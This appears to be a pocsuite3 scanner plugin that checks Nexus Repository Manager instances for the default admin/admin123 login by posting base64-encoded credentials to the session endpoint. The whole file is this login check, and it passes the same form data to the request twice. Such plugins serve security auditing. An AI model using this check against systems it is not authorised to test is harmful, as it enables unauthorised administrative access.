#!/usr/bin/env python
# -*- coding:utf-8 -*-
from plugin.pocsuite3.api import Output, POCBase, register_poc, requests
from plugin.pocsuite3.thirdparty.eyeJo import parse_ip_port, make_verify_url
import base64


class TestPOC(POCBase):
    vulID = ''''''
    cveID = ''''''
    cnvdID = ''''''
    cnnvdID = ''''''
    version = ''''''
    author = ''''''
    vulDate = ''''''
    createDate = ''''''
    updateDate = ''''''
    name = '''nexus_admin_weakpass'''
    desc = ''''''
    severity = '''medium'''
    vulType = '''app-weakpass'''
    taskType = '''app-vul'''
    references = ['''''']
    appName = ''''''
    appVersion = ''''''
    appPowerLink = ''''''
    samples = ['''''']
    install_requires = ['''''']

    def _verify(self):
        self.url, ip, port = parse_ip_port(self.target, 80)
        result = {}
        payload = '/service/rapture/session'
        payload_url = make_verify_url(self.url, payload, mod=0)
        user = 'admin'
        passwd = 'admin123'
        post_data = {'username': base64.b64encode(user.encode()), 'password': base64.b64encode(passwd.encode())}
        resp = requests.post(payload_url, post_data,post_data, verify=False, timeout=15)
        if resp.status_code == 204:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = payload_url
            result['VerifyInfo']['Username'] = user
            result['VerifyInfo']['Password'] = passwd
        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output


register_poc(TestPOC)
